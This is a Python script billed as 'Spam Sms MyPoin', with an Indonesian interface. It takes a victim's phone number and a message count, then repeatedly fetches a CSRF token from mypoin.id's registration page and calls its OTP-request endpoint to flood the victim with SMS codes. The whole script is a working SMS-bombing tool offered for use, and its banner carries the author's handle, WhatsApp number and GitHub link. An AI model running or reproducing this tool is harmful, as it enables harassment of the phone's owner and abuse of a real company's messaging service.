# -*- coding: utf-8 -*-
import requests, json, time, sys, os
from bs4 import BeautifulSoup as bs
from colorama import Fore,Style, init as segawon
segawon(autoreset=True)
hijau = Style.BRIGHT+Fore.GREEN
merah = Style.BRIGHT+Fore.RED
kuning = Style.BRIGHT+Fore.YELLOW
magenta = Style.BRIGHT+Fore.MAGENTA
reset = Fore.RESET


def tunggu(t):
	while t:
		wd='[#] Jeda selama '+str(t)+" detik "
		print(wd,end='\r',flush=True)
		time.sleep(1)
		t -= 1


url = 'https://mypoin.id/register/validate-phone-number'
otp = 'https://mypoin.id/register/request-otp'
r  = requests.Session()
ua = {"user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"}
uatp = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","content-length": "102","content-type": "application/x-www-form-urlencoded; charset=UTF-8","origin": "https://mypoin.id","referer": "https://mypoin.id/register/validate-phone-number","sec-fetch-mode": "cors","sec-fetch-site": "same-origin","user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36","x-requested-with": "XMLHttpRequest"}
os.system('clear')
print("""\n ███▄ ▄███▓▓██   ██▓ ██▓███   ▒█████   ██▓ ███▄    █ 
▓██▒▀█▀ ██▒ ▒██  ██▒▓██░  ██▒▒██▒  ██▒▓██▒ ██ ▀█   █ 
▓██    ▓██░  ▒██ ██░▓██░ ██▓▒▒██░  ██▒▒██▒▓██  ▀█ ██▒
▒██    ▒██   ░ ▐██▓░▒██▄█▓▒ ▒▒██   ██░░██░▓██▒  ▐▌██▒
▒██▒   ░██▒  ░ ██▒▓░▒██▒ ░  ░░ ████▓▒░░██░▒██░   ▓██░
░ ▒░   ░  ░   ██▒▒▒ ▒▓▒░ ░  ░░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒ 
░  ░      ░ ▓██ ░▒░ ░▒ ░       ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░
░      ░    ▒ ▒ ░░  ░░       ░ ░ ░ ▒   ▒ ░   ░   ░ ░ 
       ░    ░ ░                  ░ ░   ░           ░ 
            ░ ░                                      \n""")

os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
os.system("echo Nama Tool: Spam Sms MyPoin | lolcat -a")
os.system("echo Author: N4B1Lx75 | lolcat -a")
os.system("echo Whatsapp: +628811883541 | lolcat -a")
os.system("echo Github: https://github.com/AbilSeno | lolcat -a")
os.system("echo Youtube: Nothing | lolcat -a")
os.system("echo x•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••x | lolcat -a")
nope = input(f"{merah}[?] Masukkan no target: ")
jml = int(input(f"{kuning}[?] Jumlah sms: "))
print(" ")
z = 1
for x in range(jml):
	a = r.get(url,headers=ua).text
	b = bs(a,'html.parser')
	c = b.find("input",attrs={"type":"hidden","name":"csrfmiddlewaretoken"})
	e = r.post(otp,headers=uatp,data={"phone":nope,"csrfmiddlewaretoken": c["value"]}).text
	if e == '{"status": "ok"}':
		print(f"[{z}] [{hijau}Success{reset}] Spam to{magenta} {nope}										")
		if z == jml:break
		else:tunggu(30)
	else:
		print(f"[{z}] [{merah}Failed{reset}] Spam to {magenta}{nope}										")
		tunggu(30)
		if z == jml:break
		else:tunggu(30)
	z += 1
